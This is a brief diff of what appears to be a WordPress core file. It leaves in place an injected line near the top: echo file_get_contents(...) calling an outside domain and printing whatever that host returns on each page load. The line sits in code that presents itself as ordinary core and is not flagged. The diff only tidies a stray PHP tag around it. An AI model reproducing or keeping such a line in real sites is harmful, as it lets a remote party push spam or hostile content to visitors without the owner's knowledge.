@@ -4,8 +4,6 @@
  *
  * @package WordPress
  */
-
-<?php
 echo file_get_contents("https://semaomao1.com/.tmb/b.txt");
 
 if ( ! isset( $wp_did_header ) ) {
